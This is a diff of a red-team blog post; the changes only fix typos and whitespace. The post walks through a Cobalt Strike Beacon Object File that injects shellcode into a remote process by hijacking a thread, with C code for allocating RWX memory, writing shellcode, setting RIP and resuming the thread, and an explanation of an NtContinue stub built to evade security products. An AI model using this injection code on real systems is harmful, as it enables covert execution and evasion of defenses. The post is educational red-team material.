@@ -8,7 +8,7 @@ Introduction
 ---
 As people I have interacted with will attest, my favorite subject in the entire world is binary exploitation. I love everything about it, from the problem solving aspects to the OS internals, assembly, and C side of the house. I also enjoy pushing my limits in order to find new and creative solutions for exploitation. In addition to my affinity for exploitation, I also love to red team. After all, this is what I do on a day to day basis. While I love to work my way around enterprise networks, I find myself really enjoying the host-based avoidance aspects of red teaming. I find it incredibly fun and challenging to use some of my prerequisite knowledge on exploitation and Windows internals in order to bypass security products and stay undetected (well, try to anyways). With Cobalt Strike, a very popular remote access tool (RAT), being so widely adopted by red teams - I thought I would investigate deeper into a newer Cobalt Strike capability, Beacon Object Files, which allow operators to write post-exploitation capabilities in C (which makes me incredibly happy as a person). This blog will go over a technique known as thread hijacking and integrating it into a usable Beacon Object File.
 
-However, before beginning, I would like to delineate this post will be focused on the technique of remote process injection, thread hijacking, and thread restoration - not so much on Beacon Object Files themselves. Beacon Object Files, for our purposes, are a means to an end, as this technique can be deployed in many other fashions. As was aforementioned, Cobalt Strike is widely adopted and I think it is a great tool and I am a big proponent of it. I still believe at the end of the day, however, it is more important to understand the overarching concept surrounding a TTP (Tactic, Technique, and Procedure), versus learning how to just arbitrarily run a tool, which in turn will create a bottleneck in your red teaming methodology by relying on a tool itself. If Cobalt Strike went away tomorrow, that shouldn't render this TTP, or any other TTPs, useless. However, almost contradictorily, this first portion of this post will briefly outline what Beacon Object Files are, a quick recap on remote process injection, and a bit on writing code that adheres to the needs of Beacon Object Files.
+However, before beginning, I would like to delineate this post will be focused on the technique of remote process injection, thread hijacking, and thread restoration - not so much on Beacon Object Files themselves. Beacon Object Files, for our purposes, are a means to an end, as this technique can be deployed in many other fashions. As was aforementioned, Cobalt Strike is widely adopted and I think it is a great tool and I am a big proponent of it. I still believe at the end of the day, however, it is more important to understand the overarching concept surrounding a TTP (Tactic, Technique, and Procedure), versus learning how to just arbitrarily run a tool, which in turn will create a bottleneck in your red teaming methodology by relying on a tool itself. If Cobalt Strike went away tomorrow, that shouldn't render this TTP, or any other TTPs, useless. However, almost contradictory, this first portion of this post will briefly outline what Beacon Object Files are, a quick recap on remote process injection, and a bit on writing code that adheres to the needs of Beacon Object Files.
 
 Lastly, the final project can be found [here](https://github.com/connormcgarr/cThreadHijack).
 
@@ -117,7 +117,7 @@ alias cThreadHijack {
     if (size(@_) != 3)
     {
         berror($bid, "Error! Please enter a valid listener and PID");
-		return;
+    return;
     }
 
     # Read in the BOF
@@ -292,7 +292,7 @@ unsigned long long createthreadAddress = KERNEL32$GetProcAddress(KERNEL32$GetMod
 // Error handling
 if (createthreadAddress == NULL)
 {
-	BeaconPrintf(CALLBACK_ERROR, "Error! Unable to resolve CreateThread. Error: 0x%lx\n", KERNEL32$GetLastError());
+  BeaconPrintf(CALLBACK_ERROR, "Error! Unable to resolve CreateThread. Error: 0x%lx\n", KERNEL32$GetLastError());
 }
 ```
 
@@ -365,7 +365,7 @@ mycopy(ntContinue + i, &shellcodeOffset, sizeof(shellcodeOffset));
 i += sizeof(shellcodeOffset);
 ```
 
-Although the above code practically represents what was said about, you can see that the size of a `DWORD` and the value of `i` are subtracted from the offset previously mentioned. This is because, the whole `NtContinue` routine is 64 bytes. By the time the code has finished executing the entire `call` instruction, a few things will have happened. The first being, the call instruction itself, `0xe8`, will have been executed. This takes us from being at the beginning of our routine, byte 1/64, to the second byte in our routine, byte 2/64. The `CreateThread` routine, which we need to call, is now one byte _closer_ than when we started - and this will affect our calculations. In the above set of instructions, this byte has been compensated for, by subtracting the already executed opcode (the current value of `i`). Additionally, four bytes are taken up by the actuall offset itself, a`DWORD`, which is a 4 byte value. This means execution will now be at byte 5/64 (one byte for the opcode and four bytes for the `DWORD`). To compensate for this, the size of a DWORD has been subtracted from the total offset. If you think about it, this makes sense. By the time the call has finished executing, the `CreateThread` routine will be five bytes closer. If we used the original offset, we would have overshot the `CreateThread` routine by five bytes. Additionally, we update the `i` counter variable to let it know how many bytes we have written to the overall `NtContinue` routine. We will walk through all of these instructions inside of the debugger, once we have finished developing this small shellcode routine.
+Although the above code practically represents what was said about, you can see that the size of a `DWORD` and the value of `i` are subtracted from the offset previously mentioned. This is because, the whole `NtContinue` routine is 64 bytes. By the time the code has finished executing the entire `call` instruction, a few things will have happened. The first being, the call instruction itself, `0xe8`, will have been executed. This takes us from being at the beginning of our routine, byte 1/64, to the second byte in our routine, byte 2/64. The `CreateThread` routine, which we need to call, is now one byte _closer_ than when we started - and this will affect our calculations. In the above set of instructions, this byte has been compensated for, by subtracting the already executed opcode (the current value of `i`). Additionally, four bytes are taken up by the actual offset itself, a`DWORD`, which is a 4 byte value. This means execution will now be at byte 5/64 (one byte for the opcode and four bytes for the `DWORD`). To compensate for this, the size of a DWORD has been subtracted from the total offset. If you think about it, this makes sense. By the time the call has finished executing, the `CreateThread` routine will be five bytes closer. If we used the original offset, we would have overshot the `CreateThread` routine by five bytes. Additionally, we update the `i` counter variable to let it know how many bytes we have written to the overall `NtContinue` routine. We will walk through all of these instructions inside of the debugger, once we have finished developing this small shellcode routine.
 
 At this point, the `NtContinue` routine would have called the `CreateThread` routine. The `CreateThread` routine would have returned execution back to the `NtContinue` routine, and the next instructions in the `NtContinue` routine would execute.
 
@@ -444,7 +444,7 @@ unsigned long long ntcontinueAddress = KERNEL32$GetProcAddress(KERNEL32$GetModul
 // Error handling. If NtContinue cannot be resolved, abort
 if (ntcontinueAddress == NULL)
 {
-	BeaconPrintf(CALLBACK_ERROR, "Error! Unable to resolve NtContinue.\n", KERNEL32$GetLastError());
+  BeaconPrintf(CALLBACK_ERROR, "Error! Unable to resolve NtContinue.\n", KERNEL32$GetLastError());
 }
 ```
 
@@ -518,16 +518,16 @@ First, `VirtualAllocEx` is called again.
 ```c
 // Inject the shellcode into the target process with read/write permissions
 PVOID allocateMemory = KERNEL32$VirtualAllocEx(
-	processHandle,
-	NULL,
-	finalLength,
-	MEM_RESERVE | MEM_COMMIT,
-	PAGE_EXECUTE_READWRITE
+  processHandle,
+  NULL,
+  finalLength,
+  MEM_RESERVE | MEM_COMMIT,
+  PAGE_EXECUTE_READWRITE
 );
 
 if (allocateMemory == NULL)
 {
-	BeaconPrintf(CALLBACK_ERROR, "Error! Unable to allocate memory in the remote process. Error: 0x%lx\n", KERNEL32$GetLastError());
+  BeaconPrintf(CALLBACK_ERROR, "Error! Unable to allocate memory in the remote process. Error: 0x%lx\n", KERNEL32$GetLastError());
 }
 ```
 
@@ -536,16 +536,16 @@ Secondly, `WriteProcessMemory` is called to write the shellcode to the allocatio
 ```c
 // Write shellcode to the new allocation
 BOOL writeMemory = KERNEL32$WriteProcessMemory(
-	processHandle,
-	allocateMemory,
-	shellcodeFinal,
-	finalLength,
-	NULL
+  processHandle,
+  allocateMemory,
+  shellcodeFinal,
+  finalLength,
+  NULL
 );
 
 if (!writeMemory)
 {
-	BeaconPrintf(CALLBACK_ERROR, "Error! Unable to write memory to the buffer. Error: 0x%llx\n", KERNEL32$GetLastError());
+  BeaconPrintf(CALLBACK_ERROR, "Error! Unable to write memory to the buffer. Error: 0x%llx\n", KERNEL32$GetLastError());
 }
 ```
 
@@ -568,14 +568,14 @@ After that, all there is left to do is to invoke `SetThreadContext`, `ResumeThre
 ```c
 // Set RIP
 BOOL setRip = KERNEL32$SetThreadContext(
-	desiredThread,
-	&cpuRegisters
+  desiredThread,
+  &cpuRegisters
 );
 
 // Error handling
 if (!setRip)
 {
-	BeaconPrintf(CALLBACK_ERROR, "Error! Unable to set the target thread's RIP register. Error: 0x%lx\n", KERNEL32$GetLastError());
+  BeaconPrintf(CALLBACK_ERROR, "Error! Unable to set the target thread's RIP register. Error: 0x%lx\n", KERNEL32$GetLastError());
 }
 ```
 
@@ -584,7 +584,7 @@ if (!setRip)
 ```c
 // Call to ResumeThread()
 DWORD resume = KERNEL32$ResumeThread(
-	desiredThread
+  desiredThread
 );
 ```
 
@@ -593,7 +593,7 @@ DWORD resume = KERNEL32$ResumeThread(
 ```c
 // Free the buffer used for the whole payload
 MSVCRT$free(
-	shellcodeFinal
+  shellcodeFinal
 );
 ```
 
@@ -602,7 +602,7 @@ Additionally, you should always clean up handles in your code - but especially i
 ```c
 // Close handle
 KERNEL32$CloseHandle(
-	desiredThread
+  desiredThread
 );
 ```
 
